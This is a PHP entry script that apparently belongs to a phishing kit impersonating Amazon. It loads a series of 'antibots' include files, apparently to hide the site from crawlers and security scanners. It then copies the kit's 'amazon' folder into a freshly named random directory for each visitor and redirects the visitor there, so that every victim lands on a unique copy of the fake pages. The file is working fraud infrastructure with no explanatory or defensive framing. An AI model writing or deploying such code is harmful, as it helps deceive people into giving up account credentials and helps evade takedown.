<?php
session_start();
include('amazon/antibots.php');
include 'amazon/bots/anti1.php';
include 'amazon/bots/anti2.php';
include 'amazon/bots/anti3.php';
include 'amazon/bots/anti4.php';
include 'amazon/bots/anti5.php';
include 'amazon/bots/anti6.php';
include 'amazon/bots/anti7.php';
include 'amazon/bots/anti8.php';
$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$dst		= substr(md5($random), 0, 5);
	
function recurse_copy($src, $dst) {

	$dir = opendir($src);
	$result = ($dir === false ? false : true);

	if ($result !== false) {
		$result = @mkdir($dst);

		if ($result === true) {
			while(false !== ( $file = readdir($dir)) ) { 
				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
					if ( is_dir($src . '/' . $file) ) { 
						$result = recurse_copy($src . '/' . $file,$dst . '/' . $file); 
					} else { 
						$result = copy($src . '/' . $file,$dst . '/' . $file); 
					} 
				} 
			} 
			closedir($dir);
		}
	}

	return $result;
}

$src="amazon";
recurse_copy( $src, $dst );
header("location:".$dst."");
exit;
?>
